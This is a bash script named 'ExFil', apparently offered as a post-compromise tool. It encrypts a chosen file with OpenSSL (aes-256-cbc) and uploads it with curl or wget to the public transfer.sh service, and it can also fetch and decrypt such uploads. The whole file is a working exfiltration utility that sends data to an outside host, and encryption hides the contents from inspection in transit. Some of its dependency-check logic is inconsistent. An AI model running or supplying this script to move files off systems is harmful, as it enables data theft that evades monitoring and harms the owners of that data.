#!/usr/bin/env bash

# ExFil
#
# Encrypt and exfil data using OpenSSL
# and the 'transfer.sh' service.
#
# Made by Jiab77
# Based on the awesome work done by THC
#
# Version 0.0.1

# Options
set -o xtrace

# Config
ENC_ALGO="aes-256-cbc"
PVR_NAME="transfer.sh"
PVR_URL="https://transfer.sh"

# Internals
SCR_NAME="$(basename "$0")"
BIN_CURL=$(which curl 2>/dev/null)
BIN_WGET=$(which wget 2>/dev/null)
BIN_OPENSSL=$(which openssl 2>/dev/null)
BIN_GPG=$(which gpg 2>/dev/null)

# Functions
function enc_upload() {
    echo -e "\nEncrypt / Upload...\n"
    # cat "$1" | openssl "$ENC_ALGO" -pbkdf2 -e | curl -X PUT --upload-file "-" "$PVR_URL"/"$(basename "$1")"
    if [[ -n $BIN_CURL ]]; then
        openssl "$ENC_ALGO" -pbkdf2 -e -in "$1" | curl -X PUT --upload-file "-" "$PVR_URL"/"$(basename "$1")"
    else
        local TMP_FILE ; TMP_FILE="$(mktemp)"
        openssl "$ENC_ALGO" -pbkdf2 -e -in "$1" -out "$TMP_FILE" | wget --method PUT --body-file="$TMP_FILE" "$PVR_URL"/"$(basename "$1")" -O - -nv
    fi
}
function enc_download() {
    echo -e "\nDownload / Decrypt...\n"
    if [[ -n $BIN_CURL ]]; then
        curl -s "$1" | openssl "$ENC_ALGO" -pbkdf2 -d > "$(basename "$1")"
    else
        wget -q "$1" -O - | openssl "$ENC_ALGO" -pbkdf2 -d > "$(basename "$1")"
    fi
}
function print_missing() {
    echo -e "\nError: Missing '$1' binary. Please install any supported one."
    exit 1
}
function print_usage() {
    echo -e "\nUsage: $SCR_NAME <file> - Encrypt and send file to '$PVR_NAME'."
    exit 1
}
function print_help() {
    echo -e "\nUsage: $SCR_NAME <file> - Encrypt and send file to '$PVR_NAME'."
    echo -e "\nArguments:"
    echo -e "  -h | --help\t\t Print this help message"
    echo -e "  -s | --send\t\t Encrypt and send file to '$PVR_NAME' (default)"
    echo -e "  -d | --download\t Download and decrypt file from '$PVR_NAME'"
    echo -e "\nExamples:"
    echo -e "  * $SCR_NAME <file>"
    echo -e "  * $SCR_NAME -s <file>"
    echo -e "  * $SCR_NAME -d <url>"
    exit 0
}

# Checks
[[ $# -eq 0 ]] && print_usage
[[ $1 == "-h" || $1 == "--help" ]] && print_help
[[ -z $BIN_CURL || -z $BIN_WGET ]] && print_missing "curl' or 'wget"
[[ -z $BIN_GPG || -z $BIN_OPENSSL ]] && print_missing "gpg' or 'openssl"

# Main
if [[ $# -eq 1 && -r "$1" ]]; then
    enc_upload "$1"
elif [[ $# -eq 2 && ($1 == "-s" || $1 == "--send") ]]; then
    shift
    enc_upload "$1"
elif [[ $# -eq 2 && ($1 == "-d" || $1 == "--download") ]]; then
    shift
    enc_download "$1"
else
    echo -e "\nError: Invalid argument given.\n"
    print_usage
fi
